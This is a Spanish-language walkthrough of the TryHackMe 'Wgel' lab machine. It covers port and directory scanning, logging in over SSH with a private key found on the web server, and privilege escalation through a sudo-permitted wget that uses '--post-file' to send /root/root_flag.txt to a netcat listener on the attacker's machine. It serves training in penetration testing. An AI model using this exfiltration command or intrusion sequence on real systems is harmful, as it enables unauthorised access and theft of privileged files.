---
title: TryHackMe Wgel Writeup
published: true
---

La máquina Wgel es una máquina de TryHackMe en la que mediante la explotación de un servidor web conseguimos tanto la flag del usuario como la de root.

# [](#header-1)Enumeración

La enumeración se trata de una de las fases principales, en las que recolectamos la máxima información posible de la máquina víctima.

Usaremos nmap para analizar los puertos abiertos:

```bash
nmap -p- --open --min-rate 5000 -vvv -n $IP-VICTIMA -oG allPorts
```

*  Escaneo todos los puertos abiertos: -p- --open

*  Mediante --min-rate 5000 indicamos que queremos emitir paquetes no más lentos que 5000 paquetes por segundo.

*  Triple verbose (-vvv) para que vaya reportando por consola los puertos abiertos y no tener que esperar al final del escaneo.

*  Para que el escaneo no aplique resolución DNS usamos -n

*  En mi caso exporto los puertos abiertos en formato grepeable (-oG) al archivo allPorts

```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-15 05:59 EDT
Initiating Connect Scan at 05:59
Scanning 10.10.17.209 [65535 ports]
Discovered open port 80/tcp on 10.10.17.209
Discovered open port 22/tcp on 10.10.17.209
Completed Connect Scan at 06:00, 22.82s elapsed (65535 total ports)
Nmap scan report for 10.10.17.209
Host is up, received user-set (0.069s latency).
Scanned at 2022-10-15 05:59:51 EDT for 23s
Not shown: 41633 filtered tcp ports (no-response), 23900 closed tcp ports (conn-refused)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 22.88 seconds
```

Nos reporta una serie de puertos abiertos. Debido a que el puerto 80 está abierto, introducimos la $IP-VICTIMA en un buscador y nos reporta el servicio Apache. No podemos sacar muchas más información por lo que inseccionamos el código de la página y conseguimos un usuario potencial con un comentario en el código:

```html
Jessie don't forget to udate the website
```
Para obtener más información podemos realizar un escaneo con nmap para obtener más información de estos:

```bash
❯ nmap -sCV -p22, 80 $IP-VICTIMA -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-15 06:06 EDT
Nmap scan report for 10.10.17.209
Host is up (0.051s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.63 seconds
[1]    5495 segmentation fault  nmap -sCV -p22,80 10.10.17.209 -oN targeted
```
No muchas más información, únicamente una posible clave RSA.

Escaneamos directorios con gobuster y nos reporta lo siguiente:

```bash
❯ gobuster dir -u http://10.10.17.209/ -w /usr/share/wordlists/dirb/common.txt -t 25 -x php,html,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.17.209/
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2022/10/15 06:10:52 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/.hta.php             (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.hta.html            (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.hta.txt             (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 11374]
/index.html           (Status: 200) [Size: 11374]
/server-status        (Status: 403) [Size: 277]  
/sitemap              (Status: 301) [Size: 314] [--> http://10.10.17.209/sitemap/]
                                                                                  
===============================================================
2022/10/15 06:11:30 Finished
===============================================================
```

Nos metemos en la IP seguido de /sitemap y encontramos una web pero nada más.

DEcidimos volver a escanear pero desde el directorio /sitemap

```bash
❯ gobuster dir -u http://10.10.17.209/sitemap/ -w /usr/share/wordlists/dirb/common.txt -t 25 -x php,html,txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.17.209/sitemap/
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2022/10/15 06:14:11 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.php        (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.ssh                 (Status: 301) [Size: 319] [--> http://10.10.17.209/sitemap/.ssh/]
/.htaccess.html       (Status: 403) [Size: 277]                                        
/.hta.php             (Status: 403) [Size: 277]                                        
/.htpasswd.txt        (Status: 403) [Size: 277]                                        
/.htaccess.txt        (Status: 403) [Size: 277]                                        
/.hta.html            (Status: 403) [Size: 277]                                        
/.htpasswd.php        (Status: 403) [Size: 277]                                        
/.htaccess            (Status: 403) [Size: 277]                                        
/.htpasswd.html       (Status: 403) [Size: 277]                                        
/.hta.txt             (Status: 403) [Size: 277]                                        
/about.html           (Status: 200) [Size: 12232]                                      
/blog.html            (Status: 200) [Size: 12745]                                      
/contact.html         (Status: 200) [Size: 10346]                                      
/css                  (Status: 301) [Size: 318] [--> http://10.10.17.209/sitemap/css/] 
/fonts                (Status: 301) [Size: 320] [--> http://10.10.17.209/sitemap/fonts/]
/images               (Status: 301) [Size: 321] [--> http://10.10.17.209/sitemap/images/]
/index.html           (Status: 200) [Size: 21080]                                        
/index.html           (Status: 200) [Size: 21080]                                        
/js                   (Status: 301) [Size: 317] [--> http://10.10.17.209/sitemap/js/]    
/services.html        (Status: 200) [Size: 10131]                                        
/shop.html            (Status: 200) [Size: 17257]                                        
/work.html            (Status: 200) [Size: 11428]                                        
                                                                                         
===============================================================
2022/10/15 06:14:49 Finished
===============================================================
```

De los directorios que nos reporta con código existoso, el único que llama la atención es /.ssh

Entramos en el y nos reporta una clave privada de SSH.

# [](#header-1)Acceso al sistema

Con el usuario anterior, intentamos conectarnos por SSH con la clave privada. Para ello debemos crearnos un archivo que se llame id_rsa y darle permisos con chmod (chmod 600 id_rsa). En este punto nos conectamos:

```bash
❯ ssh -i id_rsa jessie@10.10.17.209
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


8 packages can be updated.
8 updates are security updates.

jessie@CorpOne:~$ 
```

Conseguimos acceso al sistema. Investigamos un poco y conseguimos la flag del usuario:

```bash
jessie@CorpOne:~$ ls -R
.:
Desktop  Documents  Downloads  examples.desktop  Music  Pictures  Public  Templates  Videos

./Desktop:

./Documents:
user_flag.txt

./Downloads:

./Music:

./Pictures:

./Public:

./Templates:

./Videos:
jessie@CorpOne:~$ cd Documents/
jessie@CorpOne:~/Documents$ cat user_flag.txt 
????????????????????????''
```

Hacemos sudo -l para ver que comandos podemos ejecutar como root y nos reporta lo siguiente:

```bash
jessie@CorpOne:~/Documents$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

# [](#header-1)Escalada de privilegios

Parece ser que podemos pasarnos archivos a nuestro equipo mediante wget. Visito <a href="http://gtfobins.github.io">GTFOBins</a> para ver el método y lo llevo a cabo.

Me pongo en esucha por el puerto 80 desde mi equipo y redirigo el output que me va a llegar al archivo root_flag.txt

```bash
❯ nc -lnvp 80 > root_flag.txt
listening on [any] 80 ...
```

Por otro lado, desde el usuario Jessie ejecutamos:

```bash
sudo /usr/bin/wget --post-file=/root/root_flag.txt http://$YOUR-IP/
```

Nos confirma la conexión y podemos abrir el archivo root_flag desde nuestro equipo:

```bash
❯ cat root_flag.txt
───────┬─────────────────────────────────────────────────────────────────────────────────────────────
       │ File: root_flag.txt
───────┼─────────────────────────────────────────────────────────────────────────────────────────────
   1   │ POST / HTTP/1.1
   2   │ User-Agent: Wget/1.17.1 (linux-gnu)
   3   │ Accept: */*
   4   │ Accept-Encoding: identity
   5   │ Host: 10.8.79.39
   6   │ Connection: Keep-Alive
   7   │ Content-Type: application/x-www-form-urlencoded
   8   │ Content-Length: 33
   9   │ 
  10   │ ??????????????????????????????????
───────┴─────────────────────────────────────────────────────────────────────────────────────────────
```

Obtenemos así la flag de root!

Muchas gracias por leer este writeup, espero que te haya gustado!
